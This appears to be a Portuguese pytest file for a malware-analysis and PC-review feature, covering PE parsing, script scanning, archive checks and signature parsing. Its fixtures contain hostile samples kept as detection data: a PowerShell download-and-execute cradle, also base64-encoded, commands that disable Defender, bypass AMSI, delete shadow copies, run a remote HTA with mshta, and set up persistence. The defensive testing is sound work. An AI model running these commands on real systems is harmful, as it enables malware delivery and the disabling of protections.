"""Segurança: leitor de PE, padrões perigosos, análise de arquivos, revisão do PC (com saídas simuladas do
PowerShell), histórico, memória, VirusTotal (transporte simulado), atalhos e rotas. Sem rede e sem Windows."""

from __future__ import annotations

import base64
import json
import os
import struct
import time
import zipfile
from datetime import date, datetime, timedelta
from pathlib import Path

import httpx
import pytest
from fastapi.testclient import TestClient

from sexta.cerebro.agente import Agente
from sexta.cerebro.ferramentas import CONFIRMAR, LIVRE
from sexta.extensoes import seguranca as mod
from sexta.extensoes.seguranca import arquivo, padroes, pc, pe
from sexta.extensoes.seguranca.servico import Seguranca, interpretar_virustotal
from sexta.util.texto import normalizar

from pe_sintetico import montar_pe
from test_agente import OllamaFalso, cliente

ASSINADO = {"status": "Valid", "texto": "válida", "assinante": "Fabricante Exemplo Ltda", "emissor": "CA Exemplo",
            "validade": "2030-01-01", "carimbo": True}
SEM_ASSINATURA = {"status": "NotSigned", "texto": "sem assinatura", "assinante": ""}
ALTERADO = {"status": "HashMismatch", "texto": "não confere", "assinante": "Fabricante Exemplo Ltda"}
MALICIOSO = {"kernel32.dll": ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "OpenProcess",
                              "ExitProcess"],
             "user32.dll": ["SetWindowsHookExW", "GetAsyncKeyState"],
             "wininet.dll": ["InternetOpenW", "InternetOpenUrlW"]}
COMANDO_ESCONDIDO = "IEX (New-Object Net.WebClient).DownloadString('http://exemplo.invalid/a.ps1')"


def enc(texto: str) -> str:
    return base64.b64encode(texto.encode("utf-16-le")).decode()


def analisar(caminho: Path, assinatura: dict = SEM_ASSINATURA, **kw) -> dict:
    return arquivo.analisar(caminho, assinatura=lambda _c: dict(assinatura), **kw)


def gravar(pasta: Path, nome: str, dados: bytes | str) -> Path:
    caminho = pasta / nome
    caminho.parent.mkdir(parents=True, exist_ok=True)
    caminho.write_bytes(dados.encode("utf-8") if isinstance(dados, str) else dados)
    return caminho


def ids(r: dict) -> set[str]:
    return {m["id"] for m in r["motivos"]}


# ---------------------------------------------------------------- leitor de PE

@pytest.mark.parametrize("usar_pefile", [True, False])
def test_le_cabecalhos_secoes_e_importacoes(usar_pefile):
    dados = montar_pe(MALICIOSO, timestamp=1_700_000_000)
    info = pe.ler(dados, usar_pefile=usar_pefile)
    assert info.maquina.startswith("x86") and info.bits == 32 and not info.dll and not info.dotnet
    assert info.subsistema == "programa com janela"
    assert info.compilado_em.year == 2023
    assert [s.nome for s in info.secoes] == [".text", ".idata"] and info.secoes[0].executavel
    assert info.importacoes["kernel32.dll"][:3] == ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]
    assert "SetWindowsHookEx" in info.funcoes() and "InternetOpen" in info.funcoes()  # sem o sufixo W
    assert info.leitor_importacoes == ("pefile" if usar_pefile else "proprio")


def test_leitor_proprio_e_pefile_concordam():
    dados = montar_pe(MALICIOSO)
    assert pe.ler(dados, usar_pefile=False).importacoes == pe.ler(dados, usar_pefile=True).importacoes


def test_dll_dotnet_compactador_e_sobra():
    info = pe.ler(montar_pe(dll=True, clr=True, nomes_secoes=("UPX0", "UPX1"), codigo_aleatorio=True,
                            sobra=b"\0" * 1000), usar_pefile=False)
    assert info.dll and info.dotnet and info.compactadores == ["UPX"] and info.sobra == 1000
    assert info.secoes[0].entropia > 7.2
    assert any("UPX" in i for i in pe.parece_compactado(info)) and any("entropia" in i for i in pe.parece_compactado(info))


def test_entropia():
    assert pe.entropia(b"") == 0 and pe.entropia(b"\0" * 100) == 0
    assert pe.entropia(bytes(range(256)) * 4) == pytest.approx(8.0)


@pytest.mark.parametrize("dados", [b"MZ", b"MZ" + b"\0" * 100, b"ZM" + b"\0" * 100,
                                   montar_pe()[:0x60]])
def test_pe_truncado_ou_invalido(dados):
    with pytest.raises(pe.ErroPE):
        pe.ler(dados, usar_pefile=False)


def test_data_de_compilacao_no_futuro():
    info = pe.ler(montar_pe(timestamp=int(time.time()) + 400 * 86400), usar_pefile=False)
    assert "futuro" in pe.data_suspeita(info)
    assert pe.data_suspeita(pe.ler(montar_pe(), usar_pefile=False)) is None


# ---------------------------------------------------------------- análise de programas

def test_programa_assinado_e_comum_tem_baixo_risco(tmp_path):
    caminho = gravar(tmp_path, "Instalador.exe", montar_pe({"kernel32.dll": ["CreateFileW", "ExitProcess"],
                                                            "user32.dll": ["MessageBoxW"]}))
    r = analisar(caminho, ASSINADO)
    assert r["risco"] == "baixo" and r["categoria"] == "pe" and "assinado" in ids(r)
    assert r["sha256"] == __import__("hashlib").sha256(caminho.read_bytes()).hexdigest()
    assert "assinado por Fabricante Exemplo Ltda" in r["veredito"] and "Baixo risco" in r["veredito"]
    assert r["limites"] and "não o executei" in r["limites"][0]
    json.dumps(r)  # tudo serializável (vai para o histórico e para o HUD)


def test_programa_com_injecao_teclado_e_comando_escondido_tem_alto_risco(tmp_path):
    caminho = gravar(tmp_path, "atualizador.exe", montar_pe(MALICIOSO, strings=[
        "http://exemplo.invalid/carga.bin", "203.0.113.50", "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        f"powershell -w hidden -enc {enc(COMANDO_ESCONDIDO)}"]))
    r = analisar(caminho)
    assert r["risco"] == "alto"
    assert {"injecao", "teclado", "powershell_base64", "download_execucao", "sem_assinatura"} <= ids(r)
    assert set(r["capacidades"]) >= {"injecao", "teclado", "rede"}
    escondido = next(m for m in r["motivos"] if m["id"] == "powershell_base64")
    assert "DownloadString" in escondido["evidencias"][0]  # o base64 foi decodificado para mostrar
    assert r["strings"]["urls"] == ["http://exemplo.invalid/carga.bin"] and "203.0.113.50" in r["strings"]["ips"]
    assert "Alto risco" in r["veredito"] and "vírus" not in r["veredito"].lower()
    assert {"injecao", "teclado", "ofuscacao"} <= set(r["tecnicas"])


def test_programa_disfarcado_de_documento(tmp_path):
    r = analisar(gravar(tmp_path, "fatura.pdf", montar_pe()))
    assert r["risco"] == "alto" and "extensao_falsa" in ids(r)
    r = analisar(gravar(tmp_path, "fatura.pdf.exe", montar_pe()))
    assert "dupla_extensao" in ids(r) and r["risco"] in ("medio", "alto")
    r = analisar(gravar(tmp_path, "foto\u202egpj.exe", montar_pe()))
    assert r["risco"] == "alto" and "nome_disfarcado" in ids(r)


def test_assinatura_alterada_pesa_e_compactado_aparece(tmp_path):
    r = analisar(gravar(tmp_path, "app.exe", montar_pe(nomes_secoes=("UPX0", "UPX1"), codigo_aleatorio=True)), ALTERADO)
    assert {"assinatura_alterada", "compactado"} <= ids(r) and r["risco"] == "alto"


def test_dotnet_explica_o_limite(tmp_path):
    r = analisar(gravar(tmp_path, "Ferramenta.exe", montar_pe(clr=True)), ASSINADO)
    assert ".NET" in r["descricao"] and any("ILSpy" in l for l in r["limites"])


def test_assinatura_fora_do_windows_vira_limite(tmp_path):
    r = arquivo.analisar(gravar(tmp_path, "x.exe", montar_pe()))  # sem dublê: o Windows não existe aqui
    assert r["assinatura"]["status"] == "indisponivel"
    assert any("só dá para conferir no Windows" in l for l in r["limites"])


def test_erros_de_arquivo(tmp_path):
    with pytest.raises(arquivo.ErroAnalise, match="Não encontrei"):
        analisar(tmp_path / "nada.exe")
    with pytest.raises(arquivo.ErroAnalise, match="pasta"):
        analisar(tmp_path)
    r = analisar(gravar(tmp_path, "vazio.txt", b""))
    assert r["risco"] == "baixo" and r["tamanho"] == 0


# ---------------------------------------------------------------- scripts

@pytest.mark.parametrize("nome, conteudo, esperado, risco", [
    ("instala.ps1", "iex (New-Object Net.WebClient).DownloadString('http://exemplo.invalid/x')",
     "download_execucao", "medio"),
    ("rodar.bat", f"@echo off\npowershell.exe -NoP -W Hidden -enc {enc(COMANDO_ESCONDIDO)}\n",
     "powershell_base64", "alto"),
    ("limpa.ps1", "Set-MpPreference -DisableRealtimeMonitoring $true\nAdd-MpPreference -ExclusionPath C:\\Users",
     "defender", "medio"),
    ("resgate.bat", "vssadmin delete shadows /all /quiet\nbcdedit /set {default} recoveryenabled No", "copias_sombra",
     "alto"),
    ("baixa.js", 'var x = new ActiveXObject("MSXML2.XMLHTTP"); x.open("GET","http://exemplo.invalid/a.exe");'
                 'var s = new ActiveXObject("ADODB.Stream"); s.SaveToFile("a.exe");'
                 'new ActiveXObject("WScript.Shell").Run("a.exe", 0);', "download_execucao", "alto"),
    ("emb.vbs", "x = " + " & ".join(f"Chr({70 + i})" for i in range(12)) + "\nExecute x", "ofuscacao", "baixo"),
    ("tarefa.bat", 'schtasks /create /tn "Atualiza" /tr "%APPDATA%\\a.exe" /sc onlogon', "persistencia", "baixo"),
    ("amsi.ps1", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')", "amsi", "alto"),
])
def test_scripts_perigosos(tmp_path, nome, conteudo, esperado, risco):
    r = analisar(gravar(tmp_path, nome, conteudo))
    assert r["categoria"] == "script" and esperado in ids(r), r["motivos"]
    assert r["risco"] == risco, (r["pontos"], r["motivos"])
    motivo = next(m for m in r["motivos"] if m["id"] == esperado)
    assert motivo["evidencias"]
    if esperado in ("defender", "copias_sombra", "persistencia", "amsi"):
        assert motivo["evidencias"][0].startswith("linha ")


def test_script_comum_tem_baixo_risco_e_nao_cobra_assinatura(tmp_path):
    r = analisar(gravar(tmp_path, "backup.ps1", "Copy-Item C:\\Users\\eu\\Documents D:\\Backup -Recurse\n"
                                                "Write-Host 'Pronto'\n"))
    assert r["risco"] == "baixo" and not [m for m in r["motivos"] if m["peso"] > 0]
    assert "sem_assinatura" not in ids(r)
    assert "não vi nada suspeito" in r["veredito"]


def test_script_utf16_com_bom(tmp_path):
    texto = "Set-MpPreference -DisableRealtimeMonitoring $true"
    r = analisar(gravar(tmp_path, "u16.ps1", b"\xff\xfe" + texto.encode("utf-16-le")))
    assert "defender" in ids(r)


def test_decodificar_powershell():
    assert padroes.decodificar_powershell(enc("Get-Date")) == "Get-Date"
    assert padroes.decodificar_powershell("!!!") is None


def test_strings_interessantes_ignora_certificados_e_versoes():
    achadas = padroes.strings_interessantes([
        "http://crl.digicert.com/x.crl", "https://exemplo.invalid/api", "versao 1.2.3.4", "10.0.0.8",
        "HKEY_CURRENT_USER\\Software\\Exemplo", "C:\\Users\\Public\\a.exe", "0.0.0.0"])
    assert achadas["urls"] == ["https://exemplo.invalid/api"]
    assert achadas["ips"] == ["10.0.0.8"]
    assert achadas["registro"] == ["HKEY_CURRENT_USER\\Software\\Exemplo"]
    assert achadas["caminhos"] == ["C:\\Users\\Public\\a.exe"]


def test_extrair_strings_ascii_e_utf16():
    dados = b"\0\0abcdefg\0\0" + "Unicode!".encode("utf-16-le") + b"\0\0ab\0"
    assert padroes.extrair_strings(dados) == ["abcdefg", "Unicode!"]


# ---------------------------------------------------------------- ASAR, ZIP e outros formatos

def montar_asar(arquivos: dict[str, bytes]) -> bytes:
    arvore: dict = {"files": {}}
    corpo, offset = b"", 0
    for caminho, conteudo in arquivos.items():
        no = arvore
        partes = caminho.split("/")
        for parte in partes[:-1]:
            no = no["files"].setdefault(parte, {"files": {}})
        no["files"][partes[-1]] = {"size": len(conteudo), "offset": str(offset)}
        corpo += conteudo
        offset += len(conteudo)
    texto = json.dumps(arvore).encode()
    preenchido = texto + b"\0" * (-len(texto) % 4)
    cabecalho = struct.pack("<II", len(preenchido) + 4, len(texto)) + preenchido
    return struct.pack("<II", 4, len(cabecalho)) + cabecalho + corpo


APP_ELECTRON = {
    "package.json": json.dumps({"name": "meu-app", "productName": "Meu App", "version": "1.2.0", "main": "main.js",
                                "dependencies": {"electron-store": "1"}}).encode(),
    "main.js": b"const { app } = require('electron');",
    "src/preload.js": b"contextBridge.exposeInMainWorld('api', {})",
    "node_modules/sqlite/build/sqlite.node": b"\0" * 10,
}


def test_asar_lista_e_le_sem_executar(tmp_path):
    caminho = gravar(tmp_path, "app.asar", montar_asar(APP_ELECTRON))
    r = analisar(caminho)
    assert r["categoria"] == "asar" and r["risco"] == "baixo"
    asar = r["detalhes"]["asar"]
    assert asar["arquivos"] == 4 and asar["nome"] == "Meu App" and asar["principal"] == "main.js"
    assert asar["preload"] == ["src/preload.js"] and asar["modulos_nativos"] == ["node_modules/sqlite/build/sqlite.node"]
    assert any("engenharia reversa" in s for s in r["sugestoes"])
    assert arquivo.ler_arquivo_asar(caminho, "main.js") == "const { app } = require('electron');"
    with pytest.raises(arquivo.ErroAnalise):
        arquivo.ler_arquivo_asar(caminho, "nao/existe.js")


def test_exe_electron_aponta_o_asar(tmp_path):
    gravar(tmp_path, "resources/app.asar", montar_asar(APP_ELECTRON))
    r = analisar(gravar(tmp_path, "MeuApp.exe", montar_pe()), ASSINADO)
    assert "Electron" in r["descricao"] and r["detalhes"]["asar"]["nome"] == "Meu App"


def test_zip_com_programa_e_documento_com_macros(tmp_path):
    caminho = tmp_path / "boleto.zip"
    with zipfile.ZipFile(caminho, "w") as z:
        z.writestr("boleto.pdf.exe", montar_pe())
        z.writestr("leia.txt", "oi")
    r = analisar(caminho)
    assert {"programa_compactado", "dupla_extensao_interna"} <= ids(r) and r["risco"] in ("medio", "alto")
    docm = tmp_path / "planilha.docm"
    with zipfile.ZipFile(docm, "w") as z:
        z.writestr("[Content_Types].xml", "<x/>")
        z.writestr("word/document.xml", "<x/>")
        z.writestr("word/vbaProject.bin", b"\0")
    r = analisar(docm)
    assert "macros" in ids(r) and r["descricao"].startswith("documento do Office")


def test_tipo_real_pelos_bytes():
    assert arquivo.identificar(b"%PDF-1.7", ".pdf")[0] == "pdf"
    assert arquivo.identificar(b"\x89PNG\r\n\x1a\n", ".jpg")[0] == "imagem"
    assert arquivo.identificar(b"L\x00\x00\x00\x01\x14\x02\x00", ".lnk")[0] == "lnk"
    assert arquivo.identificar(b"Write-Host oi", ".ps1") == ("script", "script PowerShell")
    assert arquivo.identificar(bytes(range(256)), ".dat")[0] == "outro"


def test_pdf_com_acao_ao_abrir(tmp_path):
    r = analisar(gravar(tmp_path, "doc.pdf", b"%PDF-1.4\n1 0 obj << /OpenAction 2 0 R /JavaScript (app.alert(1)) >>"))
    assert "pdf_ativo" in ids(r)


# ---------------------------------------------------------------- assinatura (saída simulada do PowerShell)

def test_interpretar_assinatura():
    saida = json.dumps({"Status": "Valid", "Mensagem": "Signature verified.",
                        "Assinante": "CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, C=US",
                        "Emissor": "CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation",
                        "Validade": "2027-03-01", "Carimbo": True, "Tipo": "Authenticode"})
    a = arquivo.interpretar_assinatura(saida)
    assert a["status"] == "Valid" and a["assinante"] == "Microsoft Corporation" and a["texto"] == "válida"
    assert a["emissor"] == "Microsoft Code Signing PCA 2011" and a["carimbo"] and not a["catalogo"]
    assert arquivo.interpretar_assinatura('{"Status":"NotSigned"}')["texto"] == "sem assinatura"
    assert arquivo.interpretar_assinatura("lixo")["status"] == "erro"


def test_assinatura_usa_o_caminho_escapado():
    vistos = []
    a = arquivo.assinatura_windows(Path("C:/Users/O'Neil/x.exe"),
                                   powershell=lambda cmd: vistos.append(cmd) or '{"Status":"HashMismatch"}')
    assert a["status"] == "HashMismatch" and "O''Neil" in vistos[0]


# ---------------------------------------------------------------- revisão do PC (saídas simuladas)

SAIDA_PS = {
    "inicializacao": [
        {"Name": "OneDrive", "Command": '"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe" /background',
         "Location": "HKU\\S-1-5-21-1\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "User": "PC\\eu"},
        {"Name": "Atualizador", "Command": "powershell -w hidden -enc " + enc(COMANDO_ESCONDIDO),
         "Location": "HKU\\S-1-5-21-1\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "User": "PC\\eu"},
        {"Name": "svc", "Command": "C:\\Users\\eu\\AppData\\Local\\Temp\\svc.exe",
         "Location": "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", "User": "Public"},
        {"Name": "Spotify", "Command": "Spotify.lnk", "Location": "Startup", "User": "PC\\eu"},
    ],
    "aprovados": {"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\StartupFolder|Spotify.lnk": 3,
                  "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run|OneDrive": 2},
    "tarefas": [
        {"Nome": "GoogleUpdateTaskMachineUA", "Pasta": "\\", "Autor": "Google",
         "Acoes": "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /ua /installsource scheduler"},
        {"Nome": "Limpeza", "Pasta": "\\", "Autor": "?", "Acoes": "mshta.exe http://exemplo.invalid/a.hta"},
        {"Nome": "SoCom", "Pasta": "\\", "Autor": "?", "Acoes": ""},
    ],
    "defender": {"AMServiceEnabled": True, "AntivirusEnabled": True, "RealTimeProtectionEnabled": False,
                 "IsTamperProtected": True, "AntivirusSignatureAge": 2, "QuickScanAge": 3},
    "antivirus": {"displayName": "Windows Defender", "productState": 393472},
    "firewall": [{"Name": "Domain", "Enabled": "True"}, {"Name": "Private", "Enabled": "True"},
                 {"Name": "Public", "Enabled": "False"}],
    "ultima_atualizacao": (date.today() - timedelta(days=90)).isoformat(), "ultima_atualizacao_id": "KB5031234",
    "uac": 1, "rdp_negado": 0,
}
CONEXOES = [
    {"pid": 4, "processo": "System", "exe": None, "status": "LISTEN", "lip": "0.0.0.0", "lport": 445, "rip": "", "rport": None},
    {"pid": 900, "processo": "svchost.exe", "exe": "C:\\Windows\\System32\\svchost.exe", "status": "LISTEN",
     "lip": "0.0.0.0", "lport": 135, "rip": "", "rport": None},
    {"pid": 1200, "processo": "svchost.exe", "exe": "C:\\Windows\\System32\\svchost.exe", "status": "LISTEN",
     "lip": "0.0.0.0", "lport": 3389, "rip": "", "rport": None},
    {"pid": 50, "processo": "estranho.exe", "exe": "C:\\Users\\eu\\AppData\\Local\\Temp\\estranho.exe",
     "status": "LISTEN", "lip": "0.0.0.0", "lport": 4444, "rip": "", "rport": None},
    {"pid": 60, "processo": "node.exe", "exe": "C:\\Program Files\\nodejs\\node.exe", "status": "LISTEN",
     "lip": "127.0.0.1", "lport": 5173, "rip": "", "rport": None},
    {"pid": 70, "processo": "chrome.exe", "exe": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
     "status": "ESTABLISHED", "lip": "192.168.0.10", "lport": 50000, "rip": "142.250.0.1", "rport": 443},
    {"pid": 70, "processo": "chrome.exe", "exe": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
     "status": "ESTABLISHED", "lip": "192.168.0.10", "lport": 50001, "rip": "142.250.0.2", "rport": 443},
    {"pid": 50, "processo": "estranho.exe", "exe": "C:\\Users\\eu\\AppData\\Local\\Temp\\estranho.exe",
     "status": "ESTABLISHED", "lip": "192.168.0.10", "lport": 50002, "rip": "45.77.10.20", "rport": 6667},
    {"pid": 80, "processo": "spotify.exe", "exe": "C:\\Users\\eu\\AppData\\Roaming\\Spotify\\Spotify.exe",
     "status": "ESTABLISHED", "lip": "192.168.0.10", "lport": 50003, "rip": "192.168.0.1", "rport": 80},
]


class ColetorFalso:
    def __init__(self, saida_ps=None, conexoes=None, processos=None, assinaturas=None, extensoes=None, falhar_ps=False):
        self.saida_ps = SAIDA_PS if saida_ps is None else saida_ps
        self._conexoes = CONEXOES if conexoes is None else conexoes
        self._processos = processos if processos is not None else [
            {"pid": 50, "nome": "estranho.exe", "exe": "C:\\Users\\eu\\AppData\\Local\\Temp\\estranho.exe"},
            {"pid": 90, "nome": "ferramenta.exe", "exe": "D:\\Ferramentas\\ferramenta.exe"},
            {"pid": 70, "nome": "chrome.exe", "exe": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
        ]
        self._assinaturas = assinaturas if assinaturas is not None else {
            "c:\\users\\eu\\appdata\\local\\temp\\estranho.exe": {"status": "NotSigned", "assinante": ""},
            "d:\\ferramentas\\ferramenta.exe": {"status": "NotSigned", "assinante": ""},
            "c:\\program files\\google\\chrome\\application\\chrome.exe": {"status": "Valid", "assinante": "Google LLC"},
        }
        self._extensoes = extensoes or []
        self.falhar_ps = falhar_ps
        self.scripts: list[str] = []
        self.pedidas: list[list[str]] = []

    def powershell(self, script, timeout=90):
        self.scripts.append(script)
        if self.falhar_ps:
            raise OSError("powershell não encontrado")
        return json.dumps(self.saida_ps)

    def conexoes(self):
        return self._conexoes

    def processos(self):
        return self._processos

    def assinaturas(self, caminhos):
        self.pedidas.append(caminhos)
        return {c.lower(): self._assinaturas[c.lower()] for c in caminhos if c.lower() in self._assinaturas}

    def extensoes(self):
        return self._extensoes


def por_id(r: dict) -> dict[str, dict]:
    return {i["id"]: i for i in r["itens"]}


def test_revisao_completa_prioriza_e_explica():
    coletor = ColetorFalso(extensoes=[
        {"navegador": "Chrome", "id": "abc", "nome": "Cupons Grátis", "versao": "1.0",
         "permissoes": ["<all_urls>", "cookies", "webRequest"], "da_loja": False},
        {"navegador": "Edge", "id": "def", "nome": "Tradutor", "versao": "2.0", "permissoes": ["activeTab"], "da_loja": True}])
    r = pc.revisar(coletor, pid_proprio=999)
    itens = por_id(r)
    riscos = [i["risco"] for i in r["itens"]]
    assert riscos == sorted(riscos, key=lambda x: pc.ORDEM_RISCO[x])  # mais grave primeiro
    assert r["risco"] == "alto"
    # inicialização
    assert itens["ini-0"]["risco"] == "baixo" and itens["ini-0"]["acao"]["acao"] == "desativar_inicializacao"
    assert itens["ini-1"]["risco"] == "alto" and "baixa algo da internet e executa" in itens["ini-1"]["detalhe"]
    assert itens["ini-2"]["risco"] == "alto" and "pasta temporária" in itens["ini-2"]["detalhe"]
    assert itens["ini-3"]["risco"] == "ok" and itens["ini-3"]["acao"]["acao"] == "reativar_inicializacao"
    # tarefas
    assert itens["tarefa-1"]["risco"] in ("medio", "alto") and itens["tarefa-1"]["acao"]["acao"] == "desativar_tarefa"
    assert itens["tarefas-comuns"]["risco"] == "baixo" and "GoogleUpdate" in itens["tarefas-comuns"]["evidencias"][0]
    # proteção
    assert itens["defender-tempo-real"]["risco"] == "alto"
    assert itens["firewall"]["risco"] == "alto" and "Public" in itens["firewall"]["detalhe"]
    assert itens["atualizacoes"]["risco"] == "medio" and itens["rdp"]["risco"] == "medio"
    # portas e conexões
    assert itens["porta-4444-estranho.exe"]["risco"] == "alto"
    assert itens["porta-3389-svchost.exe"]["risco"] == "medio"
    assert "445 (System, compartilhamento de arquivos (SMB))" in itens["portas-sistema"]["evidencias"]
    assert itens["portas-internas"]["risco"] == "ok"
    assert [c["processo"] for c in r["conexoes"]] == ["chrome.exe", "estranho.exe"]  # a rede local não conta
    assert itens["conexao-estranho.exe"]["risco"] == "alto" and itens["conexao-chrome.exe"]["risco"] == "baixo"
    # processos e extensões
    assert itens["processo-50"]["risco"] == "alto" and itens["processo-50"]["acao"]["acao"] == "analisar"
    assert "ferramenta.exe" in itens["processos-sem-assinatura"]["evidencias"][0]
    assert itens["ext-Chrome-abc"]["risco"] == "alto" and "não veio da loja oficial" in itens["ext-Chrome-abc"]["detalhe"]
    assert itens["ext-Edge-def"]["risco"] == "baixo"
    assert r["veredito"].startswith("Encontrei")
    # as assinaturas são pedidas de uma vez, sem os programas do Windows
    assert len(coletor.pedidas) == 1 and not any("\\windows\\" in c.lower() for c in coletor.pedidas[0])
    json.dumps(r)


def test_revisao_de_uma_parte_so_roda_o_necessario():
    coletor = ColetorFalso()
    r = pc.revisar(coletor, ("conexoes",))
    assert coletor.scripts == [] and {i["categoria"] for i in r["itens"]} == {"conexoes"}
    assert "Usando a internet agora: chrome (2) e estranho (1)." in mod.resumo_parte(r, "conexoes")
    r = pc.revisar(coletor, ("inicializacao",))
    assert "Win32_StartupCommand" in coletor.scripts[-1] and "Get-MpComputerStatus" not in coletor.scripts[-1]
    texto = mod.resumo_parte(r, "inicializacao")
    assert texto.startswith("Iniciam com o Windows: Atualizador, svc e OneDrive.") and "Spotify" not in texto
    assert "Merecem atenção" in texto
    r = pc.revisar(coletor, ("portas",))
    assert "4444 aberta por estranho.exe" in mod.resumo_parte(r, "portas")


def test_powershell_falhando_nao_derruba_a_revisao():
    r = pc.revisar(ColetorFalso(falhar_ps=True))
    assert any("powershell não encontrado" in e for e in r["erros"])
    assert any(i["categoria"] == "portas" for i in r["itens"])


def test_tudo_em_ordem():
    saida = {"defender": {"RealTimeProtectionEnabled": True, "AntivirusSignatureAge": 0, "IsTamperProtected": True},
             "firewall": [{"Name": "Public", "Enabled": "True"}], "ultima_atualizacao": date.today().isoformat(),
             "uac": 1, "rdp_negado": 1, "inicializacao": [], "tarefas": []}
    r = pc.revisar(ColetorFalso(saida_ps=saida, conexoes=[], processos=[], assinaturas={}))
    assert r["risco"] == "baixo" and r["veredito"].startswith("Tudo em ordem")


def test_outro_antivirus_ligado_deixa_o_defender_passivo():
    dados = {"defender": {"RealTimeProtectionEnabled": False},
             "antivirus": [{"displayName": "Windows Defender", "productState": 393472},
                           {"displayName": "Kaspersky", "productState": 266240}]}
    itens = {i.id: i for i in pc.avaliar_protecao(dados)}
    assert itens["defender-tempo-real"].risco == "ok" and itens["av-Kaspersky"].risco == "ok"


def test_chave_de_aprovacao_da_inicializacao():
    assert pc.chave_aprovacao("HKU\\S-1\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "x", "App") == (
        "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run", "App")
    assert pc.chave_aprovacao("HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", "x", "A")[0] \
        .endswith("StartupApproved\\Run32")
    assert pc.chave_aprovacao("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "x", "A")[0].startswith("HKLM:")
    assert pc.chave_aprovacao("Startup", "Spotify.lnk", "Spotify")[1] == "Spotify.lnk"
    assert pc.chave_aprovacao("Common Startup", "", "Zoom") == (
        "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\StartupFolder", "Zoom.lnk")


def test_scripts_de_correcao_sao_reversiveis_e_escapados():
    s = pc.script_inicializacao("desativar", "HKU\\S\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "", "App d'Ana")
    assert "[byte[]](3,0,0,0,0,0,0,0,0,0,0,0)" in s and "'App d''Ana'" in s and "Remove-" not in s
    assert "[byte[]](2," in pc.script_inicializacao("reativar", "Startup", "a.lnk", "a")
    assert pc.script_tarefa("desativar", "Limpeza", "\\").startswith("Disable-ScheduledTask -TaskName 'Limpeza'")


def test_interpretar_assinaturas_em_lote():
    saida = json.dumps({"Caminho": "C:\\A\\a.exe", "Status": "Valid", "Assinante": "CN=Empresa A, O=A"})
    assert pc.interpretar_assinaturas(saida) == {"c:\\a\\a.exe": {"status": "Valid", "assinante": "Empresa A"}}
    assert pc.interpretar_assinaturas("") == {}
    assert "ConvertFrom-Json" in pc.script_assinaturas(["C:\\O'Neil\\a.exe"]) and "O''Neil" in pc.script_assinaturas(["C:\\O'Neil\\a.exe"])


def test_executavel_do_comando_e_pastas():
    assert pc.executavel_do_comando('"C:\\Program Files\\X\\x.exe" --min') == "C:\\Program Files\\X\\x.exe"
    assert pc.executavel_do_comando("C:\\Apps\\Meu App\\app.exe /s") == "C:\\Apps\\Meu App\\app.exe"
    assert pc.pasta_suspeita("C:\\Users\\eu\\Downloads\\x.exe") == "pasta Downloads"
    assert pc.pasta_suspeita("C:\\Users\\eu\\AppData\\Roaming\\x.exe") == "raiz da pasta AppData\\Roaming"
    assert pc.pasta_suspeita("C:\\Users\\eu\\AppData\\Roaming\\Spotify\\Spotify.exe") is None


def test_listar_extensoes_dos_navegadores(tmp_path):
    base = tmp_path / "Google" / "Chrome" / "User Data" / "Default" / "Extensions" / "idabc" / "1.0_0"
    gravar(base, "manifest.json", json.dumps({"name": "__MSG_nome__", "version": "1.0", "permissions": ["cookies"],
                                              "content_scripts": [{"matches": ["<all_urls>"]}],
                                              "update_url": "https://clients2.google.com/service/update2/crx"}))
    gravar(base, "_locales/en/messages.json", json.dumps({"nome": {"message": "Bloqueador"}}))
    extensoes = pc.listar_extensoes(tmp_path)
    assert extensoes == [{"navegador": "Chrome", "id": "idabc", "nome": "Bloqueador", "versao": "1.0",
                          "permissoes": ["<all_urls>", "cookies"], "da_loja": True}]
    assert pc.listar_extensoes(tmp_path / "nada") == []


# ---------------------------------------------------------------- serviço, histórico e memória

class MemoriaFalsa:
    def __init__(self):
        self.aprendido: list[tuple] = []

    def aprender(self, tipo, texto, etiquetas=(), origem=""):
        self.aprendido.append((tipo, texto, list(etiquetas), origem))


@pytest.fixture
def seg(app, tmp_path, monkeypatch):
    casa = tmp_path / "casa"
    for nome in ("Downloads", "Desktop", "Documents"):
        (casa / nome).mkdir(parents=True)
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: casa))
    monkeypatch.delenv("VIRUSTOTAL_API_KEY", raising=False)
    app.memoria_original = app.memoria
    app.memoria = MemoriaFalsa()
    servico = app.seguranca
    servico.assinatura = lambda _c: dict(SEM_ASSINATURA)
    servico.coletor = ColetorFalso()
    servico.casa = casa
    return servico


def sem_ia(app):
    app.agente = Agente(app, cliente(OllamaFalso([])))
    return app.agente


def test_declaracoes_e_registro(app):
    from sexta.habilidades import hologramas, rotinas

    assert "seguranca" in hologramas.TIPOS and hologramas.TITULOS["seguranca"] == "Segurança"
    assert "revisao_seguranca" in rotinas.ACOES_EXTRAS
    assert {"seguranca_analisar_arquivo", "seguranca_revisar_pc", "seguranca_corrigir", "seguranca_virustotal",
            "seguranca_historico", "seguranca_strings", "seguranca_asar"} <= set(app.registro.nomes())
    assert app.prefs.get("seguranca_revisao_semanal") is False


def test_analise_guarda_historico_ensina_a_memoria_e_mostra_holograma(app, seg):
